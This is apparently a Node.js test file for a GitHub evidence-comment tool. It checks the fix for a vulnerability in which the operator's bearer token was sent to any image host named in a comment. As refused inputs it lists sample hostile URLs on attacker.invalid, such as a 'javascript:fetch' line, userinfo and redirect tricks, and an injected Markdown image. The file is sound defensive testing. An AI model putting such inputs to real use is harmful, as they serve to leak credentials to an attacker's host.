/**
 * Where the operator's GitHub token is allowed to go, and what is allowed
 * into a public comment.
 *
 * The finding: `evidence verify` regex-scanned the whole comment body for
 * Markdown images and sent `Authorization: Bearer <gh auth token>` to every
 * match, whatever the host — and the comment body contains a *fenced
 * accessibility snapshot of the driven application*, which the regex matched
 * inside. So attacker-controlled text rendered anywhere the capture reached
 * was enough to hand a real GitHub credential to a chosen host. Confirmed by
 * the security review against `attacker.invalid`.
 *
 * The token is genuinely needed — an unauthenticated request cannot read a
 * private repository's attachment — so the fix is not to drop it. It is that
 * the *destination* is decided here and never by the page.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { approvedAttachment } from "../lib/evidence.mjs";
import { sanitise, sanitiseCapture, runSecrets } from "../lib/redact.mjs";

const REAL = "https://github.com/user-attachments/assets/0f2bb21b-2e63-4018-afc4-c5e463010bde";

test("the one approved attachment destination, and the ways of not being it", () => {
  assert.equal(approvedAttachment(REAL).ok, true);

  const refused = [
    /* the exact URL the security review proved the token was sent to */
    "https://attacker.invalid/a.png",
    /* a prefix match would have passed this; an origin comparison does not */
    "https://github.com.attacker.invalid/user-attachments/assets/0f2bb21b-2e63-4018-afc4-c5e463010bde",
    "https://github.com@attacker.invalid/user-attachments/assets/0f2bb21b-2e63-4018-afc4-c5e463010bde",
    /* and a credential does not travel in clear */
    "http://github.com/user-attachments/assets/0f2bb21b-2e63-4018-afc4-c5e463010bde",
    /* right origin, wrong path: not an attachment */
    "https://github.com/firetower-cloud/fstack/raw/main/anything.png",
    "https://github.com/user-attachments/assets/../../login",
    /* right shape, with something smuggled alongside */
    `${REAL}?redirect=https://attacker.invalid`,
    `${REAL}#x`,
    "https://user:pw@github.com/user-attachments/assets/0f2bb21b-2e63-4018-afc4-c5e463010bde",
    /* and the things a regex over comment text would hand over */
    "./tasks.png",
    "javascript:fetch('https://attacker.invalid')",
    "data:image/png;base64,AAAA",
    "not a url at all",
  ];
  for (const candidate of refused) {
    const seen = approvedAttachment(candidate);
    assert.equal(seen.ok, false, `${candidate} must not be an approved destination`);
    assert.ok(seen.why.length > 10, `${candidate} needs a reason`);
  }
});

test("verify reads a recorded manifest, and nothing reads a URL out of comment text", async () => {
  /* A structural assertion, because the vulnerability was structural: the
     regex that pulled images out of the body used to live in `verify`, two
     lines above the fetch that attached the token. */
  const { readFileSync } = await import("node:fs");
  const { fileURLToPath } = await import("node:url");
  const path = (await import("node:path")).default;
  const here = path.dirname(fileURLToPath(new URL("../package.json", import.meta.url)));
  const text = readFileSync(path.join(here, "lib/evidence.mjs"), "utf8");

  const verify = text.slice(text.indexOf("async function verify("), text.indexOf("async function recordAttachments("));
  assert.ok(!/matchAll/.test(verify), "verify does not scan the comment body for anything");
  assert.match(verify, /held\?\.attachments \?\? \[\]/, "verify reads the recorded manifest");
  assert.match(verify, /text\.includes\(a\.url\)/, "the body is only asked whether it CONTAINS a recorded url");

  /* The only function that attaches a credential re-checks its own argument,
     so a future caller cannot reintroduce the hole by forgetting. */
  const reaches = text.slice(text.indexOf("async function reaches("));
  assert.ok(reaches.indexOf("approvedAttachment(url)") < reaches.indexOf("authorization"), "approved before authorized");
});

test("an attacker-chosen image URL in captured text never becomes a request target", () => {
  /* The exploitation path from the review, end to end: a URL on
     attacker.invalid reaches a UI label, gets captured into the snapshot, and
     is published inside a code fence. Two independent things now stop it. */
  const hostile = "- text: ![x](https://attacker.invalid/steal.png)";
  const { capture } = sanitiseCapture({ name: "c", snapshotText: hostile, consoleErrors: [], pageErrors: [] }, []);
  /* One: it is not published as an image reference at all. */
  assert.ok(!capture.snapshotText.includes("attacker.invalid/steal.png"));
  assert.match(capture.snapshotText, /image reference removed/);
  /* Two: even if it were, it is not an approved destination. */
  assert.equal(approvedAttachment("https://attacker.invalid/steal.png").ok, false);
});

test("captured text cannot escape the code fence it is published inside", () => {
  const fence = "`".repeat(3);
  const { text } = sanitise(`before\n${fence}\n![pwn](https://attacker.invalid/x.png)\n`, []);
  assert.ok(!text.includes(fence), "a fence in captured text would end the fence and render what follows");
  assert.ok(!text.includes("attacker.invalid/x.png"));
});

test("Playwright's accessibility snapshot carries the password, so the value is blanked", () => {
  /* Measured by the security review with the locked playwright-core: an
     `<input type="password">` value IS in ariaSnapshot(). Masking is a
     property of the rendered pixels, not of the accessibility tree — and
     `drive` has just typed this run's administrator password into one. */
  const held = { adminPassword: "verify-aVeryRealSecret", token: "gho_aRealToken" };
  /* **This is the shape ariaSnapshot actually produces**, taken off this
     app's own sign-in form rather than guessed: the role, the placeholder and
     the value are three nested lines, not one. An earlier version of the
     redactor only understood the inline `- textbox "Name": value` form and
     did not fire on this at all — the known-secret scrub was carrying it
     alone, which would have left a secret this run does not know in place. */
  const snapshot = [
    '- button "Use a different address"',
    '- heading "Who are you here?" [level=1]',
    "- textbox:",
    "  - /placeholder: Username",
    "  - text: admin",
    "- textbox:",
    "  - /placeholder: Password",
    "  - text: verify-aVeryRealSecret",
    '- button "Sign in"',
    /* the inline form too, and a secret this run has never seen */
    '- textbox "API token": ghp_somebodyElsesToken',
    '- textbox "Name this machine": 10.4.0.22',
  ].join("\n");
  const { capture, removed } = sanitiseCapture(
    { name: "c", snapshotText: snapshot, consoleErrors: [`401 for gho_aRealToken`], pageErrors: [] },
    runSecrets(held),
  );

  assert.ok(!capture.snapshotText.includes("verify-aVeryRealSecret"), "the password is not in the snapshot");
  assert.ok(!capture.consoleErrors.join("").includes("gho_aRealToken"), "nor is the bearer token in the logs");

  /* Two independent mechanisms, because either alone leaves a gap. The
     field-name rule is the one that reaches a secret this run does not know
     about, so it has to work on the nested shape and on the inline one. */
  assert.ok(!capture.snapshotText.includes("ghp_somebodyElsesToken"), "a secret this run has never seen is still removed");
  assert.match(capture.snapshotText, /- \/placeholder: Password\n\s*- text: «/);
  assert.match(capture.snapshotText, /textbox "API token": «/);
  assert.ok(removed.includes("the administrator password"));
  assert.ok(removed.includes("the values of secret-named fields"));

  /* And what is evidence stays evidence: the username, the machine address
     typed into the dialog, and the structure itself are the proof. */
  assert.ok(capture.snapshotText.includes("- text: admin"), "a field with an innocent name keeps its value");
  assert.ok(capture.snapshotText.includes("10.4.0.22"));
  assert.ok(capture.snapshotText.includes('- heading "Who are you here?" [level=1]'));
});

test("images are counted and named, never claimed to be sanitised", () => {
  /* PNG bytes are what the screen showed. Truncation is not redaction and
     neither is anything else available here, so the honest output says so and
     the control is upstream: capture synthetic data. */
  const { images } = sanitiseCapture({ name: "c", screenshot: "/tmp/tasks.png", snapshotText: "", consoleErrors: [] }, []);
  assert.deepEqual(images, ["/tmp/tasks.png"]);
});

test("the published comment no longer carries anything a secret could be derived from", async () => {
  const { readFileSync } = await import("node:fs");
  const { fileURLToPath } = await import("node:url");
  const path = (await import("node:path")).default;
  const here = path.dirname(fileURLToPath(new URL("../package.json", import.meta.url)));
  const text = readFileSync(path.join(here, "lib/evidence.mjs"), "utf8");
  const body = text.slice(text.indexOf("function body("), text.indexOf("async function post("));
  /* The isolation key named the ports, the project and the scratch root, and
     it was also the input to the old password. It is no longer published —
     and, separately, nothing is derived from it any more. */
  assert.ok(!/isolation key/.test(body), "the isolation key is not published");
  assert.ok(!/plan\.key/.test(body), "nor is it interpolated into the comment under another name");
  /* Interpolation, not the words: the comment explains in prose that the
     administrator password and the bearer token were scrubbed, which is the
     feature. What must not exist is a `${...}` that puts one in. */
  for (const match of body.matchAll(/\$\{([^}]*)\}/g)) {
    assert.ok(
      !/adminPassword|token|password|key/i.test(match[1]),
      `the comment interpolates ${match[1]}`,
    );
  }
});

test("the comment says what the capture found, not something stronger", () => {
  /* A console error is not a page error. The posted comment said "Page errors
     during this capture: 1" for a run whose terminal correctly said
     `page errors 0` and `1 console error(s) recorded, which do not fail a
     run` — a benign 404 published as a page error. Accuracy of evidence is
     the whole purpose of the bundle. */
  const text = readFileSync(new URL("../lib/evidence.mjs", import.meta.url), "utf8");
  const body = text.slice(text.indexOf("function body("), text.indexOf("async function post("));
  assert.ok(!/Page errors during this capture/.test(body), "the mislabel is gone");
  assert.match(body, /Uncaught page errors: \$\{capture\.pageErrors\?\.length \?\? 0\}/);
  /* Still a console error rather than a page error, and still said not to
     fail a run — the distinction this test was written for. */
  assert.match(body, /Console errors from the application/);
  assert.match(body, /do not fail a run/);
  /* And the two counts come from the two different arrays. */
  const uncaught = body.indexOf("Uncaught page errors");
  const console_ = body.indexOf("Console errors from the application");
  assert.ok(body.slice(uncaught, console_).includes("capture.pageErrors"));
  assert.ok(body.slice(console_ - 400).includes("capture.consoleFindings"));
});

/**
 * The console errors are listed, not just counted.
 *
 * QA's reading of a posted comment was that console errors are "counted and
 * stored but never surfaced as findings", and the terminal said only
 * `3 console error(s) … which do not fail a run`. Driving the machines row
 * logs two React `<button> cannot contain a nested <button>` errors: a real
 * defect, collected by this tool and reported as a number. A count reads as
 * reassurance, so the lines themselves have to be in the comment.
 */
test("the posted comment lists the application's console errors", () => {
  const text = readFileSync(new URL("../lib/evidence.mjs", import.meta.url), "utf8");
  const body = text.slice(text.indexOf("function body("), text.indexOf("async function post("));
  assert.match(body, /findings\.slice\(0, 5\)/, "the lines are printed, not only counted");
  assert.match(body, /consoleFindings/, "and the noise-free list is what is printed");
});

/**
 * Anything published goes through the scrub, including the field added for
 * those findings. The spread in `sanitiseCapture` would otherwise carry it
 * out unredacted, which is the one channel that file exists to close.
 */
test("consoleFindings is sanitised like every other published channel", async () => {
  const { sanitiseCapture } = await import("../lib/redact.mjs");
  const secret = "verify-aSecretNobodyShouldSee";
  const { capture, removed } = sanitiseCapture(
    {
      snapshotText: "nothing here",
      consoleErrors: [`failed with ${secret}`],
      consoleFindings: [`failed with ${secret}`],
      pageErrors: [],
    },
    [{ what: "the administrator password", value: secret }],
  );
  assert.ok(!JSON.stringify(capture).includes(secret), "the secret survived into the sanitised capture");
  assert.ok(!capture.consoleFindings[0].includes(secret));
  assert.ok(removed.includes("the administrator password"));
});
